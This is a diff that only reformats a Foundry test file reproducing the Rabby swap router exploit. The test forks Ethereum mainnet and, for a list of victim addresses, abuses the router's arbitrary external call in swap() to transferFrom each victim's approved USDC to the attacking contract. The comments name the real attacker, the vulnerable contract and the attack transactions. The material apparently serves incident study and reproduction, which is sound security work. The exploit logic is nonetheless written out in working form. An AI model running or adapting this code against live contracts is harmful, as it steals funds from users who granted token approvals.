@@ -10,7 +10,7 @@ import "./interface.sol";
 // Attacker : 0xb687550842a24d7fbc6aad238fd7e0687ed59d55
 // Attack Contract : 0x9682f31b3f572988f93c2b8382586ca26a866475
 // Vulnerable Contract : 0x6eb211caf6d304a76efe37d9abdfaddc2d4363d1 and these: https://twitter.com/Rabby_io/status/1579833969566449666
-// Attack Txs : 
+// Attack Txs :
 //      0x914c1ae4f03657064f0b1d5ddc6e06f39e82bce6fb2f726efdca52c092fbfc26
 //      0xa02c180149ce03d1b6e3d412585000b968b7db59a277717ec51d0899c1a3c017
 //      0x914c1ae4f03657064f0b1d5ddc6e06f39e82bce6fb2f726efdca52c092fbfc26
@@ -38,7 +38,6 @@ import "./interface.sol";
 // SlowMist : https://twitter.com/SlowMist_Team/status/1579839744128978945
 // Beosin Alert : https://twitter.com/BeosinAlert/status/1579856733178331139
 
-
 CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 address constant attacker = 0xb687550842a24D7FBC6Aad238fd7E0687eD59d55;
 address constant RabbySwapRouter = 0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1;
@@ -47,7 +46,7 @@ address constant usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
 
 contract Attacker is Test {
     function setUp() public {
-        cheat.createSelectFork("mainnet", 15724451);
+        cheat.createSelectFork("mainnet", 15_724_451);
         cheat.label(attacker, "attacker");
         cheat.label(RabbySwapRouter, "RabbySwapRouter");
         cheat.label(usdt, "USDT");
@@ -91,7 +90,7 @@ contract Attacker is Test {
             0x1Fc550e98aD3021e32C47A84019F77a0792c60B7
         ];
 
-        for(uint i; i < victims.length; ++i){
+        for (uint256 i; i < victims.length; ++i) {
             // Step1: Check the victim allowance
             uint256 vic_balance = IERC20(usdc).balanceOf(victims[i]);
             uint256 vic_allowance = IERC20(usdc).allowance(victims[i], RabbySwapRouter);
@@ -99,8 +98,12 @@ contract Attacker is Test {
             // Step2: If allowance >= balance: exploit!
             if (vic_allowance >= vic_balance) {
                 // Classic arbitrary external calls `swap()` vulnerability, and the parameter `address dexRouter` is controllable.
-                bytes memory usdc_callbackData = abi.encodeWithSignature("transferFrom(address,address,uint256)", victims[i], address(this), vic_balance);
-                IRabbySwap(RabbySwapRouter).swap(usdt, 0, address(this), 4660, usdc, usdc, usdc_callbackData, block.timestamp);
+                bytes memory usdc_callbackData = abi.encodeWithSignature(
+                    "transferFrom(address,address,uint256)", victims[i], address(this), vic_balance
+                );
+                IRabbySwap(RabbySwapRouter).swap(
+                    usdt, 0, address(this), 4660, usdc, usdc, usdc_callbackData, block.timestamp
+                );
             }
         }
 
@@ -118,8 +121,16 @@ contract Attacker is Test {
     receive() external payable {}
 }
 
-
 /* -------------------- Interface -------------------- */
 interface IRabbySwap {
-    function swap(address srcToken, uint256 amount, address dstToken, uint256 minReturn, address dexRouter, address dexSpender, bytes memory data, uint256 deadline) external;
+    function swap(
+        address srcToken,
+        uint256 amount,
+        address dstToken,
+        uint256 minReturn,
+        address dexRouter,
+        address dexSpender,
+        bytes memory data,
+        uint256 deadline
+    ) external;
 }
